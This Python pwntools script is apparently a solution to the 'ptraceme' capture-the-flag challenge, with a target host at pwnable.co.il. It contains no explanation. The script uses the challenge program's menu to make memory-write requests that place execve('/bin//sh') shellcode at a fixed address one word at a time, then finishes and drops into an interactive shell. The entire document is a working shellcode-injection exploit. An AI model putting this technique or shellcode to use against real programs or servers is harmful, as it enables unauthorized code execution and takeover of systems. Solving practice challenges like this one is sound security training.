from pwn import * 

context.log_level = 'DEBUG'
elf = ELF('./ptraceme')


if args['REMTOE']:
    io = remote('pwnable.co.il',9014)
else: 
    io = process([elf.path])    


starting_addr = 0x0401365
shellcode = [0x31c05068, 0x2f2f7368, 0x682f6269, 0x6e89e350, 0x5389e1b0, 0x0bcd8000]
shellcode = [str(word) for word in shellcode]



for word in shellcode:
    io.recvuntil(b'2. Finish')
    io.sendline(b'1')

    io.recvuntil(b'Request: ')
    io.sendline(b'5')

    io.recvuntil(b'Address: ')
    io.sendline(str(starting_addr))
    starting_addr += 4 

    io.recvuntil(b'Data: ')
    io.sendline(word)

io.recvuntil(b'2. Finish')
io.sendline(b'2')


io.interactive()


